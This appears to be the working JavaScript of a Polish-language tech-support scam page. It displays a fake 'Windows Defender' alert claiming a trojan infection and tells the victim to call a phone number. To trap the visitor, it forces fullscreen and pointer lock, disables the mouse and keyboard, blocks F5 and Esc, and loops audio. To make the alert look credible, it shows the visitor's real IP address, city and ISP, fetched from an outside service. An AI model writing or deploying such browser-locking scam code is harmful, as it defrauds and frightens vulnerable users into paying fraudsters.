// Progress Bar Animation
$(function () {
  let progress = 0;
  const interval = setInterval(() => {
    progress += 10;
    $("#dynamic")
      .css("width", `${progress}%`)
      .attr("aria-valuenow", progress)
      .text(`${progress}% Zakończono`);
    if (progress >= 100) clearInterval(interval);
  }, 100);
});

// Counter Plugin
(($) => {
  $.fn.countTo = function (options = {}) {
    return this.each(function () {
      const $el = $(this);
      const settings = $.extend({}, $.fn.countTo.defaults, {
        from: $el.data("from"),
        to: $el.data("to"),
        speed: $el.data("speed"),
        refreshInterval: $el.data("refresh-interval"),
        decimals: $el.data("decimals"),
      }, options);

      let loops = Math.ceil(settings.speed / settings.refreshInterval);
      let increment = (settings.to - settings.from) / loops;
      let loopCount = 0;
      let value = settings.from;

      const data = $el.data("countTo") || {};
      $el.data("countTo", data);

      data.interval && clearInterval(data.interval);

      const update = (val) => {
        $el.html(settings.formatter.call(this, val, settings));
      };

      data.interval = setInterval(() => {
        value += increment;
        loopCount++;
        update(value);
        if (typeof settings.onUpdate === "function") settings.onUpdate.call(this, value);
        if (loopCount >= loops) {
          $el.removeData("countTo");
          clearInterval(data.interval);
          value = settings.to;
          if (typeof settings.onComplete === "function") settings.onComplete.call(this, value);
        }
      }, settings.refreshInterval);

      update(value);
    });
  };

  $.fn.countTo.defaults = {
    from: 0,
    to: 0,
    speed: 100,
    refreshInterval: 100,
    decimals: 0,
    formatter: (value, settings) => value.toFixed(settings.decimals),
    onUpdate: null,
    onComplete: null,
  };
})(jQuery);

// Counter Initialization
jQuery(($) => {
  $(".count-number").data("countToOptions", {
    formatter: (value, settings) =>
      value.toFixed(settings.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ","),
  });
  $(".timer").each(function (i, el) {
    const $el = $(el);
    const opts = $.extend({}, $el.data("countToOptions") || {});
    $el.countTo(opts);
  });
});

// Fullscreen and Pointer Lock
const btn = document.querySelector(".enterfullscreen");
btn.addEventListener("click", () => {
  const el = document.documentElement;
  const rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
  if (rfs) rfs.call(el);
});
btn.addEventListener("mousemove", () => {
  const home = document.getElementById("mycanvas");
  const requestLock = home.requestPointerLock || home.mozRequestPointerLock || home.webkitRequestPointerLock;
  if (requestLock) requestLock.call(home);
});

// Pride audio loop
setInterval(() => {
  const pridez = document.getElementById("pridez");
  if (pridez) pridez.play();
}, 500);

// Favicon toggle
let faviconToggle = true;
setInterval(() => {
  document.getElementById("favicon").href = faviconToggle ? "msmm.png" : "wdi.png";
  faviconToggle = !faviconToggle;
}, 1000);

// Show welcomeDiv on mycanvas click
$(document).ready(() => {
  $("#mycanvas").on("click", () => {
    $("#welcomeDiv").show();
  });
});

// Sequential fade in
$(document).ready(() => {
  $(".infgets").delay(900).fadeIn(800);
  $(".black").delay(1000).fadeIn(800);
  $(".scsdvvfbwqwe").delay(2500).fadeIn(800);
  $(".dqdwcvbsfsaw").delay(3500).fadeIn(800);
  $("#dwrfwewvdssdfsdf").delay(4000).fadeIn(800);
  $("#qwrqwewrqwdqw").delay(4000).fadeIn(800);
});

// Show lightbox on various triggers
$(document).ready(() => {
  $("#mycanvas, #cross").on("click", () => {
    $("#qwrqwewrqwdqw").show();
  });
  $("body").on("mouseover", () => {
    $("#qwrqwewrqwdqw").show();
  });
});

// Disable mouse and keyboard events
["mousedown", "contextmenu", "mouseup", "keydown"].forEach(event =>
  document[`on${event}`] = () => false
);

// Block F5 and Esc
document.addEventListener("onkeydown", function win_onkeydown_handler(e) {
  if ([116, 27].includes(event.keyCode)) {
    event.returnValue = false;
    event.keyCode = 0;
  }
});

// Fade in chat
$(document).ready(() => {
  $("#chat").delay(600).fadeIn(100);
});

// Audio element for clicks
$(document).ready(() => {
  const audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "webs.wav");
  audioElement.addEventListener("ended", function () {
    this.play();
  }, false);

  $("#mycanvas, #link_black, .infgets, #qwrqwewrqwdqw").on("click", () => {
    audioElement.play();
  });
});

// Block context menu on body
$(function () {
  $("body").on("contextmenu", () => false);
});

// Get variable from URL
function getVariableFromURl(name) {
  name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
  const regex = new RegExp(`[\\?&]${name}=([^&#]*)`);
  const results = regex.exec(window.location.href);
  return results ? results[1] : "";
}
const ph0ne = getVariableFromURl("ph0ne");

// Populate lightbox
function populateLightbox() {
  const lightbox = document.getElementById("qwrqwewrqwdqw");
  if (!lightbox) return;
  lightbox.innerHTML = `
    <div class="ilb top" style="font-size: 17px">
      <div class="ilb headers" style="border-bottom: 1px solid #d6d5d5">
        <span class="fl title" id="txtadd">
          <span class="fl ilb">
            <img src="dm.png" class="logo3" />
          </span>
          Centrum bezpieczeństwa Windows Defender
        </span>
        <span class="fl title2 close" id="txts1">
          <a href="#" id="cross">
            <img src="cs.png" />
          </a>
        </span>
      </div>
    </div>
    <div id="txtintro">
      <span class="colo-rd">
        <div id="ip_add">Alert Zapory Microsoft-Windows!</div>
        <div id="city">
          System zainfekowany złośliwym oprogramowaniem typu trojan
        </div>
        <div id="isp">(Kod błędu: 0xMPNJ)</div>
      </span>
    </div>
    <img src="re.gif" id="banner" />
    <div id="disclaimer">
      Dostęp do tego systemu został zablokowany ze względów bezpieczeństwa. <br />
      <span class="support" style="font-size: 22px">
        Zadzwoń do pomocy Windows: &nbsp;
        <span style="border: 1px solid #114d9a; border-radius: 5px; padding: 2px 5px;">
          09 85 40 58 34
        </span>
      </span>
    </div>
    <div id="bottom">
      <img src="msmm.png" id="badge" />
      <span class="title3">Zabezpieczenia systemu Windows</span>
      <ul>
        <li>
          <a href="#">
            <div class="fr button2">
              <span id="addtochromebutton">Anuluj</span>
            </div>
          </a>
        </li>
        <li>
          <a href="#">
            <div class="fr button">
              <span id="addtochromebutton">OK</span>
            </div>
          </a>
        </li>
      </ul>
    </div>
  `;
}

// Fetch and display IP/location info in lightbox
document.addEventListener("DOMContentLoaded", () => {
  populateLightbox();
  fetch("https://ipwho.is/?lang=en")
    .then(res => res.json())
    .then(data => {
      const { ip, city, country, connection, timezone } = data;
      const currtime = timezone?.current_time || "";
      document.getElementById("ip_add").textContent = `Adres IP: ${ip} ${new Date().toLocaleString("EN-US", currtime)}`;
      document.getElementById("city").textContent = `Lokalizacja: ${city}, ${country}`;
      document.getElementById("isp").textContent = `ISP: ${connection?.isp || ""}`;
    });
});